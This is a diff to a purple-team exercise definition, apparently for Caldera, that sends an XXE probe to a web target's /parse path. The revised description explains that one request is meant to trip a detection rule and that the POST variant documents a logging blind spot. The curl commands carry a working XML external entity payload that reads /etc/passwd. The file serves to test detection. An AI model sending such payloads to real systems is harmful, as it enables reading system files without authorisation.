@@ -1,11 +1,16 @@
 - id: a1190005-0000-4000-8005-000000000005
   name: T1190 XXE Injection Probe
   description: >
-    POSTs a minimal XML payload containing an external entity declaration (<!DOCTYPE
-    foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>) to the web target's XML parsing
-    endpoint. Intended to trigger Wazuh rule 100828 (XXE pattern in HTTP request path/body).
-    The request is sent as application/xml; detection fires on the DOCTYPE keyword
-    in the Traefik log.
+    Sends a minimal XML external entity payload (<!DOCTYPE foo [<!ENTITY xxe SYSTEM
+    "file:///etc/passwd">]>) to the web target's /parse path in two ways. First as a
+    URL-encoded query-string parameter (GET /parse?xml=...): this is the request
+    intended to trigger the Sigma rule "XML External Entity Pattern In HTTP Request"
+    (traefik, attack.t1190), which matches XXE markers in the request path and query
+    string. Second as an application/xml POST body: reverse-proxy access logs do not
+    record request bodies, so this variant is expected to be invisible to access-log
+    detection and is NOT expected to raise an alert. It is kept on purpose to
+    document that blind spot. The probes expect 404 and change nothing; no cleanup
+    is needed.
   tactic: initial_access
   technique:
     attack_id: T1190
@@ -13,14 +18,10 @@
   executors:
   - platform: linux
     name: sh
+    # NB: keep this a single line (Sandcat's `sh` executor mishandles multi-line
+    # compound commands; see t1190-007).
     command: |
-      curl -sk -o /dev/null -w "xxe_probe status=%{http_code}\n" \
-        "https://#{app.web_target}/parse" \
-        -X POST \
-        -H "Content-Type: application/xml" \
-        -H "X-Purple-Team-Exercise: phase2-t1190-xxe" \
-        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' \
-        --max-time 10 2>&1 || true
+      curl -sk -o /dev/null -w "xxe_probe url status=%{http_code}\n" "https://#{app.web_target}/parse?xml=%3C!DOCTYPE%20foo%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E" -H "X-Purple-Team-Exercise: phase2-t1190-xxe" --max-time 10 2>&1 || true; sleep 1; curl -sk -o /dev/null -w "xxe_probe body status=%{http_code}\n" -X POST "https://#{app.web_target}/parse" -H "Content-Type: application/xml" -H "X-Purple-Team-Exercise: phase2-t1190-xxe" --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' --max-time 10 2>&1 || true
     cleanup:
     - |
       true
